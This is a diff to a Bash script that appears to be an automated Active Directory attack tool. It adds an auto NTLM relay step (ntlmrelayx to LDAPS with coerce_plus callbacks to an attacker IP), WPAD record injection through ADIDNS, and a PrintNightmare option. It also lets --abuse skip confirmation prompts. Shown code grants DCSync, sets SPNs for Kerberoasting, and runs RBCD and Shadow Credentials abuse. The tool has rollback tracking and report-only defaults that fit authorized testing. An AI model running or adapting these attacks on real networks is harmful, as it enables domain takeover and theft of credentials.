@@ -158,6 +158,7 @@ SUDO_KEEPALIVE_PID=""
 CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
 STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
 DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
+DEEP_CVE=0          # 1 = run slow/noisy CVE modules such as PrintNightmare
 DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
 ROLLBACK_FILE=""    # records undo actions for responsible cleanup
 GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
@@ -191,6 +192,7 @@ declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-grou
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
+declare -A ADIDNS_DONE=()         # ADIDNS records already attempted/created in this run
 declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
@@ -263,8 +265,30 @@ nxc_cred_args() {
 
 confirm() {
     [[ "$AUTO_YES" == "1" ]] && return 0
-    local ans; qst "$1 [y/N] "; read -r ans
+    local ans
+    # Keep interactive prompts visually separated from tool output. Some tools
+    # leave the cursor mid-line, which made several y/N questions appear glued
+    # together and effectively invisible in long runs.
+    [[ -t 1 ]] && printf '\n'
+    qst "$1 [y/N] "
+    read -r ans
     [[ "$ans" =~ ^([Yy]|yes|si)$ ]]
+}
+
+abuse_confirm() {
+    local msg="$1" destructive="${2:-0}"
+    [[ "$AUTO_YES" == "1" ]] && return 0
+    if [[ "$DO_ABUSE" == "1" && "$destructive" != "1" ]]; then
+        info "${msg} → auto (--abuse)"
+        return 0
+    fi
+    confirm "$msg"
+}
+
+attacker_ip() {
+    [[ -n "${LHOST:-}" ]] && { printf '%s\n' "$LHOST"; return; }
+    [[ -n "${ATTACKER_IP:-}" ]] && { printf '%s\n' "$ATTACKER_IP"; return; }
+    ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1
 }
 
 # OPSEC jitter between noisy actions when --stealth is set
@@ -750,7 +774,7 @@ _change_expired_password() {
                   "echo 'Manual: coordinate password restore for $USER with the client'"
         add_secret "$newpw" "expired-password reset for $USER"
         note_cred_source "$USER" "expired-password reset via kpasswd"
-        unset 'SEEN_CREDS[${USER,,}]'
+        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "")]"
         queue_cred "$USER" "$newpw" ""
         return 0
     fi
@@ -1187,7 +1211,11 @@ phase_cve_checks() {
     else args=(-u '' -p ''); fi
 
     local out="$OUTDIR/cve_checks_${mode}.txt"; : >"$out"
-    local modules=(zerologon printnightmare spooler coerce_plus)
+    # Keep the default CVE pass fast. Spooler/coerce_plus give actionable relay
+    # signal cheaply; printnightmare is comparatively slow/noisy and is only run
+    # when explicitly requested with --deep-cve.
+    local modules=(zerologon spooler coerce_plus)
+    [[ "$DEEP_CVE" == "1" ]] && modules=(zerologon printnightmare spooler coerce_plus)
     local m
     for m in "${modules[@]}"; do
         if ! nxc_has_module smb "$m"; then
@@ -1198,6 +1226,10 @@ phase_cve_checks() {
         run "$NXC smb $DCT ${args[*]} -M $m"
         $NXC smb "$DCT" "${args[@]}" -M "$m" 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
     done
+
+    if [[ "$DEEP_CVE" != "1" && "$STEALTH" != "1" ]]; then
+        info "Skipping slow PrintNightmare module in fast mode (use --deep-cve to run it)"
+    fi
 
     if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|Zerologon|PrintNightmare|Spooler service enabled' "$out" 2>/dev/null; then
         loot "Potential AD CVE/coercion finding(s) → $(basename "$out")"
@@ -1552,7 +1584,7 @@ phase_relay() {
     RELAY_DONE=1
     section "NTLM RELAY & COERCION ASSESSMENT"
     local args; mapfile -t args < <(nxc_cred_args)
-    local lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
+    local lhost; lhost="$(attacker_ip)"
 
     subsection "SMB signing (relay to SMB viable only if NOT required)"
     local s; s=$($NXC smb "$DCT" "${args[@]}" 2>&1 | head -1); echo "$s" | tee -a "$LOGFILE"
@@ -1594,6 +1626,29 @@ phase_relay() {
         && loot "★ Print Spooler enabled → PrinterBug (MS-RPRN) coercion available"
     $NXC smb "$DCT" "${args[@]}" -M webdav  2>&1 | tee -a "$LOGFILE" | grep -qi 'running\|enabled' \
         && loot "★ WebClient (WebDAV) running → HTTP coercion → relay to LDAP/ADCS"
+
+    if [[ "$DO_ABUSE" == "1" && "${AUTO_RELAY:-0}" == "1" ]]; then
+        if [[ -z "$lhost" ]]; then
+            warn "AUTO_RELAY requested but no callback IP was found. Export LHOST=<tun0/vpn ip>."
+        elif have impacket-ntlmrelayx; then
+            subsection "AUTO RELAY · ntlmrelayx + coerce_plus"
+            warn "Starting time-boxed LDAP relay. This needs free SMB/HTTP listener ports and a coercible target."
+            run "impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access --no-dump"
+            ( cd "$OUTDIR" && timeout -k 10 "${AUTO_RELAY_TIMEOUT:-75}" impacket-ntlmrelayx -t "ldaps://$DC_IP" -smb2support --delegate-access --no-dump 2>&1 | tee -a "$LOGFILE" | tee auto_relay_ntlmrelayx.log ) &
+            local rpid=$!
+            sleep 4
+            run "$NXC smb $DCT ${args[*]} -M coerce_plus -o LISTENER=$lhost"
+            $NXC smb "$DCT" "${args[@]}" -M coerce_plus -o LISTENER="$lhost" 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/auto_relay_coerce.txt"
+            wait "$rpid" 2>/dev/null || true
+            grep -qiE 'Delegation rights modified|Success|Authenticat|Adding a computer' "$OUTDIR/auto_relay_ntlmrelayx.log" 2>/dev/null \
+                && loot "★ Auto relay produced a useful LDAP action → auto_relay_ntlmrelayx.log" \
+                || warn "Auto relay did not capture/modify anything in the time window"
+        else
+            warn "AUTO_RELAY requested but impacket-ntlmrelayx is not installed"
+        fi
+    elif [[ "$DO_ABUSE" == "1" ]]; then
+        info "Relay/coercion needs a live listener. For automatic attempt: AUTO_RELAY=1 LHOST=${lhost:-<ip>} $0 ..."
+    fi
 
     subsection "Relay playbook (run these yourself — needs your listener)"
     local ip="${lhost:-<your-ip>}" ca="${DC_FQDN:-$DCT}"
@@ -1957,7 +2012,7 @@ phase_acl() {
             rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
             spn)    _abuse_writespn "$tgt" ;;
             dns)    warn "Writable DNS zone (${C_BOLD}${cur_name}${C_RESET}) → ${C_BOLD}ADIDNS${C_RESET} record injection (BloodHound usually misses this one)"
-                    detail "      bloodyAD --host $DCT --dc-ip $DC_IP -d $DOMAIN -u $USER -k add dnsRecord wpad <YOUR_IP>   # or wildcard '*' → coerce/relay / NetNTLM capture (needs your listener)" ;;
+                    _abuse_adidns "$cur_name" ;;
             group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
@@ -1972,11 +2027,43 @@ phase_acl() {
     done <<<"$w"
 }
 
+# AD-integrated DNS: create a useful WPAD record when the identity can create DNS
+# child objects. This is a domain-wide primitive; run it once and track rollback.
+_abuse_adidns() {
+    local zone="$1" record="${ADIDNS_RECORD:-wpad}" ba; mapfile -t ba < <(bloody_args)
+    local key="${zone,,}:${record,,}"
+    [[ -n "${ADIDNS_DONE[$key]:-}" ]] && { info "  ADIDNS ${record} already attempted for ${zone} in this run"; return; }
+    ADIDNS_DONE["$key"]=1
+
+    local ip; ip="$(attacker_ip)"
+    if [[ "$DO_ABUSE" != "1" ]]; then
+        info "  (report-only; --abuse to create ${record}.${DOMAIN} → ${ip:-LHOST})"
+        detail "      bloodyAD --host $DCT --dc-ip $DC_IP -d $DOMAIN -u $USER -k add dnsRecord $record <LHOST>"
+        return
+    fi
+    if [[ -z "$ip" ]]; then
+        warn "  ADIDNS abuse skipped: cannot infer callback IP. Export LHOST=<tun0/vpn ip> and rerun."
+        return 1
+    fi
+
+    abuse_confirm "  Add ADIDNS record '${record}' → ${ip}?" || return 1
+    run "bloodyAD ${ba[*]} add dnsRecord '$record' '$ip'"
+    local out; out=$(bloodyAD "${ba[@]}" add dnsRecord "$record" "$ip" 2>&1); echo "$out" | tee -a "$LOGFILE"
+    if grep -qiE 'success|added|created|written|already' <<<"$out"; then
+        loot "★ ADIDNS record available: ${record}.${DOMAIN} → ${ip}"
+        rb_record "Added ADIDNS record $record -> $ip" "bloodyAD ${ba[*]} remove dnsRecord '$record'"
+        info "  Pair this with relay/coercion or NetNTLM capture; the record is global for later queued identities."
+        return 0
+    fi
+    warn "  Could not create ADIDNS record '$record' in ${zone}"
+    return 1
+}
+
 # Add the current user to a group we can write (with rollback)
 _abuse_group() {
     local grp="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to add $USER to '$grp')"; return; }
-    confirm "  Add ${USER} to group '${grp}'?" || return
+    abuse_confirm "  Add ${USER} to group '${grp}'?" || return
     run "bloodyAD ${ba[*]} add groupMember '$grp' '$USER'"
     if bloodyAD "${ba[@]}" add groupMember "$grp" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qi 'added\|success'; then
         loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
@@ -1987,7 +2074,7 @@ _abuse_group() {
         # group-write and re-queues again and again (the user gets pwned N×).
         if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
             REQUEUED_SELF["${USER,,}"]=1
-            unset "SEEN_CREDS[${USER,,}]"
+            unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
             queue_cred "$USER" "$PASS" "$HASH"
         else
             info "  (already re-assessed ${USER} once with new group rights — not looping)"
@@ -2057,7 +2144,7 @@ _abuse_shadowcred() {
     local target="$1"
     have certipy || return 1
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
-    confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
+    abuse_confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
     # Prefer password/hash (certipy Kerberos is flaky); -target/-dc-host + ccache
     # only as fallback. Mirrors phase_adcs so shadow works on NTLM-on labs too.
     local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
@@ -2092,7 +2179,7 @@ _abuse_rbcd() {
     # waste a machine-account creation + noisy traceback on it.
     [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
     have impacket-getST && have impacket-addcomputer || return 1
-    confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
+    abuse_confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
     local ba; mapfile -t ba < <(bloody_args)
     local cpass="ADAutoPwn_RBCD_123!" dch="${DC_FQDN:-$DCT}"
     run "impacket-addcomputer (adpwn\$) via $USER"
@@ -2136,7 +2223,7 @@ _abuse_writespn() {
     [[ "$CAP_KERBEROS" != "1" ]] && return
     warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
-    confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
+    abuse_confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
     local spn="ADAUTOPWN/$target"
     if bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|modif'; then
         rb_record "Set temporary SPN $spn on $target" \
@@ -2162,7 +2249,7 @@ _abuse_dcsync_dacl() {
     local ba; mapfile -t ba < <(bloody_args)
     warn "Writable DACL on the domain head → can self-grant ${C_BOLD}DCSync${C_RESET}"
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to grant $USER DCSync and dump the domain)"; return; }
-    confirm "  Grant '${USER}' DCSync rights on '${DOMAIN}' and dump all hashes?" || return
+    abuse_confirm "  Grant '${USER}' DCSync rights on '${DOMAIN}' and dump all hashes?" || return
     run "bloodyAD ${ba[*]} add dcsync '$USER'"
     if bloodyAD "${ba[@]}" add dcsync "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|grant|written|dcsync'; then
         loot "★ Granted DCSync to ${USER} — replicating the domain"
@@ -2358,7 +2445,7 @@ _adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
             bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'
             loot "★ Restored+reset enroller '${sam}' → pivoting to finish ESC15 as it"
             note_cred_source "$sam" "Recycle Bin restore of ADCS enroller (SID-matched)"
-            unset "SEEN_CREDS[${sam,,}]"; unset "OWNED_GROUPS[${sam,,}]"
+            unset "SEEN_CREDS[$(cred_key "$sam" "$PIVOT_PW" "")]"; unset "OWNED_GROUPS[${sam,,}]"
             queue_cred "$sam" "$PIVOT_PW" "" "Recycle Bin restore (ADCS enroller)"
             return 0
         fi
@@ -2451,7 +2538,7 @@ _adcs_esc15_exploit() {                  # _adcs_esc15_exploit <ca> <v1tpl> <obo
         loot "★★★ ESC15 (EKUwu/Schannel) → ${C_BOLD}${USER}${C_RESET} added to '${grp}' — re-queueing for DCSync"
         note_cred_source "$USER" "ADCS ESC15 (EKUwu Schannel → Domain Admins)"
         OWNED_GROUPS[${USER,,}]="Domain Admins"
-        unset "SEEN_CREDS[${USER,,}]"
+        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
         queue_cred "$USER" "$PASS" "$HASH" "ESC15 (EKUwu Schannel → Domain Admins)"
         return 0
     fi
@@ -4735,6 +4822,8 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                 WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                 accounts. Off by default → ACLs only reported. Rollback-tracked
+  ${C_GREEN}--deep-cve${C_RESET}     Run slower/noisier CVE modules such as PrintNightmare. Default CVE checks
+                stay fast and use spooler/coerce_plus as actionable signals
   ${C_GREEN}--auto-pwn${C_RESET}     Alias for ${C_GREEN}--abuse --spray -y${C_RESET} (kept for convenience; the real
                 escalation switch is ${C_GREEN}--abuse${C_RESET})
   ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
@@ -4838,6 +4927,7 @@ parse_args() {
             --crack) DO_CRACK=1; shift;;
             --no-crack) DO_CRACK=0; shift;;
             --abuse) DO_ABUSE=1; shift;;
+            --deep-cve) DEEP_CVE=1; shift;;
             --cleanup) DO_CLEANUP=1; shift;;
             --graph) GRAPH_ZIP="$2"; shift 2;;
             --owned) OWNED_FILE="$2"; shift 2;;
